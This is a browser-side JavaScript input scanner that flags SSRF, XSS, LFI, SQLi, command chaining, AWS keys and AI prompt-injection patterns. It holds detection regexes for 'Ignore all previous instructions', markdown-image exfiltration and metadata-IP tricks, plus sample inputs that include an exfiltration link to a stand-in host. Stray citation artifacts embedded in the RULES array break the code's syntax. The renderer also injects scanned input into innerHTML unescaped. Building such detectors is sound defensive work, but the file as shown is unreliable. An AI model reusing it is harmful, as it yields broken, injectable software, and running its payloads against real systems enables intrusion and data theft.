// app_prod.js — Final Strategic Build v1.2.3 (STABLE & REFINED)
(() => {
  "use strict";

  const BUILD = "prod_v1.2.3_FINAL_STABLE";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  // ----------------------------
  // Normalization (v3)
  // ----------------------------
  function tryDecodeURIComponentSafe(s) {
    try { return decodeURIComponent(s); } catch { return s; }
  }

  function decodeMulti(s, rounds = 3) {
    let out = s;
    for (let i = 0; i < rounds; i++) {
      const next = tryDecodeURIComponentSafe(out);
      if (next === out) break;
      out = next;
    }
    return out;
  }

  function normalizeLine(raw) {
    let s = (raw ?? "").toString();
    s = s.replace(/\r/g, "").trim().replace(/\s+/g, " ");
    s = decodeMulti(s, 3);
    s = s.replace(/\\+/g, "\\");
    return s;
  }

  function parseInputLines(txt) {
    return (txt || "").split(/\r?\n/).map(normalizeLine).filter(Boolean);
  }

  // ----------------------------
  // Utilities
  // ----------------------------
  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  function classifyType(s) {
    const x = (s || "").trim();
    if (!x) return "Data";
    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
    const isExploit = /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // ----------------------------
  // RULES — Core + Cloud/AI extensions (Updated for 2026)
  // ----------------------------
  const RULES = [
    [span_3](start_span)[span_4](start_span)[span_5](start_span)// 1. Cloud SSRF / Metadata[span_3](end_span)[span_4](end_span)[span_5](end_span)
    { label: "SSRF:DECIMAL_IP", test: s => /\b(2852039166|0xa9fea9fe|0251\.0376\.0251\.0376)\b/.test(s), sev: 95, conf: 95 },
    { label: "SSRF:IMDSV2_BYPASS", test: s => /PUT\s+.*\/latest\/api\/token/i.test(s) || /X-aws-ec2-metadata-token/i.test(s), sev: 95, conf: 95 },
    { label: "CLOUD:METADATA_FLAVOR", test: s => /Metadata-Flavor:\s*Google|Metadata:\s*true/i.test(s), sev: 80, conf: 80 },

    [span_6](start_span)[span_7](start_span)[span_8](start_span)[span_9](start_span)// 2. AI Prompt Injection / Exfil[span_6](end_span)[span_7](end_span)[span_8](end_span)[span_9](end_span)
    { label: "AI:PROMPT_INJECTION", test: s => /\b(Ignore\s+all\s+previous\s+instructions|disregard\s+prior\s+rules)\b/i.test(s), sev: 90, conf: 90 },
    { label: "AI:MARKDOWN_EXFIL", test: s => /!\[.*\]\(https?:\/\/.*\/log\?c=.*\)/i.test(s), sev: 90, conf: 90 },
    { label: "AI:DELAYED_EXECUTION", test: s => /\b(The\s+next\s+time\s+the\s+user\s+says)\b/i.test(s), sev: 85, conf: 85 },

    [span_10](start_span)[span_11](start_span)// 3. Token smuggling / Homoglyph[span_10](end_span)[span_11](end_span)
    { label: "BYPASS:TOKEN_SMUGGLING", test: s => /[\u00AD\u200B-\u200D\uFEFF]/.test(s), sev: 75, conf: 80 },
    { label: "BYPASS:HOMOGLYPH", test: s => /[^\u0000-\u007F]/.test(s) && /\b(bomb|password|admin|key|token)\b/i.test(s), sev: 80, conf: 80 },

    [span_12](start_span)[span_13](start_span)// 4. Infra / Docker (Refined Rule)[span_12](end_span)[span_13](end_span)
    { label: "INFRA:DOCKER_API", test: s => /:(2375|2376)\/containers\/create/i.test(s) || /"Binds":\s*\[".*?[:\/].*?"\]/i.test(s), sev: 100, conf: 95 },

    // 5. Redirect / Open-redirect
    { label: "REDIRECT_PARAM", test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s), sev: 55, conf: 90 },

    // 6. XSS / JS
    { label: "XSS/JS_SCRIPT", test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s), sev: 85, conf: 85 },

    // 7. LFI paths
    { label: "LFI:ETC_PASSWD", test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts/i.test(s), sev: 80, conf: 75 },

    // 8. Command chaining / SQLi / Secrets
    { label: "CMD:CMD_CHAIN", test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s), sev: 85, conf: 85 },
    { label: "SQL:SQLI_UNION", test: s => /union\s+select/i.test(s), sev: 80, conf: 80 },
    { label: "SECRET:AWS_ACCESS_KEY", test: s => /\bAKIA[0-9A-Z]{16}\b/.test(s), sev: 70, conf: 90 }
  ];

  const PROD_POLICY = Object.freeze({ name: "PROD", blockSev: 85, warnSev: 55, secretsForceWarn: true });

  function decideFromHits(hits, policy) {
    let severity = hits.length ? Math.max(...hits.map(h => h.sev)) : 0;
    let confidence = hits.length ? Math.max(...hits.map(h => h.conf)) : 0;
    let decision = "ALLOW";
    const hardBlock = hits.some(h => ["XSS/JS_SCRIPT", "INFRA:DOCKER_API", "SSRF:DECIMAL_IP", "SSRF:IMDSV2_BYPASS"].includes(h.label));
    if (hardBlock || severity >= policy.blockSev) decision = "BLOCK";
    else if (severity >= policy.warnSev) decision = "WARN";
    if (policy.secretsForceWarn && hits.some(h => h.label.startsWith("SECRET:")) && decision === "BLOCK" && !hardBlock) decision = "WARN";
    return { decision, severity, confidence };
  }

  function analyzeOne(input) {
    const s = (input || "").trim();
    const hits = RULES.filter(r => r.test(s)).map(h => ({ label: h.label, sev: h.sev, conf: h.conf }));
    const { decision, severity, confidence } = decideFromHits(hits, PROD_POLICY);
    return { input: s, type: classifyType(s), decision, severity, confidence, entropy: shannonEntropy(s), hits };
  }

  function renderRows(rows) {
    const body = $("rows"); if (!body) return;
    body.innerHTML = rows.map(r => `
      <div class="vrow ${r.decision.toLowerCase()}">
        <div class="cell">${r.input}</div>
        <div class="cell">${r.type}</div>
        <div class="cell dec">${r.decision}</div>
        <div class="cell">${r.severity}%</div>
        <div class="cell">${r.confidence}%</div>
        <div class="cell">${r.entropy}</div>
      </div>
    `).join("");
  }

  function updateVerdictUI(rows) {
    const block = rows.filter(r => r.decision === "BLOCK").length;
    const warn = rows.filter(r => r.decision === "WARN").length;
    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const sigMap = new Map();
    rows.forEach(r => r.hits.forEach(h => sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1)));

    if ($("verdictText")) $("verdictText").textContent = block > 0 ? "DANGER" : (warn > 0 ? "SUSPICIOUS" : "SECURE");
    if ($("kScans")) $("kScans").textContent = rows.length;
    if ($("kBlock")) $("kBlock").textContent = block;
    if ($("kWarn")) $("kWarn").textContent = warn;
    if ($("kAllow")) $("kAllow").textContent = rows.length - block - warn;
    if ($("peakSev")) $("peakSev").textContent = `${peakSeverity}%`;
    if ($("signals")) $("signals").innerHTML = [...sigMap.entries()].map(([l, c]) => `<div class="sig">${l} ×${c}</div>`).join("");
  }

  let lastReport = null;

  function runScan() {
    const inputEl = $("input"); if (!inputEl) return;
    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    lastReport = { generatedAt: nowISO(), rows };
    updateVerdictUI(rows); renderRows(rows);
  }

  function boot() {
    if ($("buildStamp")) $("buildStamp").textContent = `Build: ${BUILD}`;
    safeOn($("btnScan"), "click", runScan);
    safeOn($("btnClear"), "click", () => { if ($("input")) $("input").value = ""; updateVerdictUI([]); renderRows([]); });
    safeOn($("btnExport"), "click", () => {
        if (!lastReport) return;
        const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob); a.download = `report_${Date.now()}.json`; a.click();
    });
    safeOn($("btnLoadA"), "click", () => { if ($("input")) $("input").value = "http://2852039166/latest/meta-data/\nPUT /latest/api/token"; runScan(); });
    safeOn($("btnLoadB"), "click", () => { if ($("input")) $("input").value = "Ignore instructions\n![exfil](http://atk.com/log?c=1)"; runScan(); });
    safeOn($("btnInfo"), "click", () => $("infoDlg")?.classList.remove("hidden"));
    safeOn($("btnCloseInfo"), "click", () => $("infoDlg")?.classList.add("hidden"));
  }

  document.readyState === "loading" ? document.addEventListener("DOMContentLoaded", boot) : boot();
})();
